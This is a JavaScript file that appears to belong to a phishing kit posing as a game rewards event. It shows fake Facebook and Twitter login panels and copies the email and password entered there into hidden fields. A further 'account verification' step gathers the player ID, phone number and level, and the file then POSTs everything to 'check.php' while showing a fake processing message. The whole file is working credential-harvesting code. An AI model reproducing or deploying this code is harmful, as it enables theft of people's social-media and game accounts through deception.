// code for activate clicked sound
var buka = new Audio();
buka.src = "media/open.mp3";

var tutup = new Audio();
tutup.src = "media/close.mp3";

// code for validate data to next step
function audioFile() {
    var audio = document.getElementById('audioFile');  
    audio.play();
}
$(document).ready(function() {
    $("o").attr("onclick", "audioFile()");  
});

function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";  
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();  
function open_account_verification() {
  $('.account_verification').show()
  $('.open_rewards').hide()
  $('.otherReward_confirmation').hide()
}
function open_mail_login() {
  $('.login-mail').show()
  $('.account_login').hide()
}
function close_mail_login() {
  $('.login-mail').hide()
  $('.account_login').show()
}
function open_about_event() {
  $('.about_event').show()
}
function open_event_rules() {
  $('.event_rules').show()
}
function open_facebook() {
  $('.login-facebook').show()
  $('.account_login').hide()
}
function open_twitter() {
  $('.login-twitter').show()
  $('.account_login').hide()
}
function close_reward_confirmation() {
  $('.open_rewards').hide()
  $('.event_rules').hide()
}
function close_reward_confirmations() {
  $('.event_rules').hide()
  $('.about_event').hide()
}
function close_facebook() {
  $('.login-facebook').hide()
  $('.account_login').show()
}
function close_twitter() {
  $('.login-twitter').hide()
  $('.account_login').show()
}
function open_newhome() {
  $('.account_login').show()
  $('.newhome').hide()
}
function open_account_login() {
  $('.account_login').show()
  $('.open_rewards').hide()
  $('.itemReward_confirmation2').hide()
  $('.itemReward_confirmation3').hide()
  $('.itemReward_confirmation4').hide()
}

// code for validate data to next step
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$email = $('#email-facebook').val().trim();
	$password = $('#password-facebook').val().trim();
	$login = $('#login-facebook').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login-facebook').hide();
	$('.account_verification').show();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}
function ValidateLoginTwitterData() {
	$('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData){
	submitingValidateLoginTwitterData.preventDefault();
	
	$email = $('#email-twitter').val().trim();
	$password = $('#password-twitter').val().trim();
	$login = $('#login-twitter').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login-twitter').hide();
	$('.account_verification').show();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}

// show hide password for facebook and twitter
function ShowFbPassword() {
    var x = document.getElementById("password-facebook");
    if (x.type === "password") {
        x.type = "text";
        $('.ShowFbPassword').hide();
        $('.HideFbPassword').show();
    } else {
        x.type = "password";
    }
}
function HideFbPassword() {
    var x = document.getElementById("password-facebook");
    if (x.type === "text") {
        x.type = "password";
        $('.ShowFbPassword').show();
        $('.HideFbPassword').hide();
    } else {
        x.type = "text";
    }
}
function ShowTwitterPassword() {
    var x = document.getElementById("password-twitter");
    if (x.type === "password") {
        x.type = "text";
        $('.ShowTwitterPassword').hide();
        $('.HideTwitterPassword').show();
    } else {
        x.type = "password";
    }
}
function HideTwitterPassword() {
    var x = document.getElementById("password-twitter");
    if (x.type === "text") {
        x.type = "password";
        $('.ShowTwitterPassword').show();
        $('.HideTwitterPassword').hide();
    } else {
        x.type = "text";
    }
}

// code for validate data to sending to file result
function ValidateVerificationData(){
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();
	
	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $playid = $("input#playid").val();
	var $phone = $("input#phone").val();
	var $level = $("input#level").val();
	var $validateLogin = $("input#validateLogin").val();
	if($validateEmail == "" && $validatePassword == "" && $playid == "" && $phone == "" && $level == "" && $validateLogin == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "check.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.check_verification').show();
			$('.account_verification').hide();
		},
		success: function(){
		$(".processing_account").show();
		$('.check_verification').hide();
		}
	});
	});  
	return false;
};